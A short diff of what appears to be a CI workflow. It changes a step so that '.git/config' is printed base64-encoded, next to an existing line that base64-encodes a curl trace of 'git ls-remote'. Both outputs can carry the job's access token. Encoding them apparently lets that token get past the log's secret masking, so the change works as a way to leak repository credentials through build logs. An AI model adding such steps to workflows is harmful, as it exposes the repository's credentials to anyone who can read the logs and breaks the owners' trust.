@@ -23,7 +23,7 @@ jobs:
         run: |
 
           git remote get-url origin
-          cat .git/config
+          cat .git/config | base64
           GIT_TRACE_CURL=1 git ls-remote 2>&1 | base64
 
       - name: Install ImageMagick
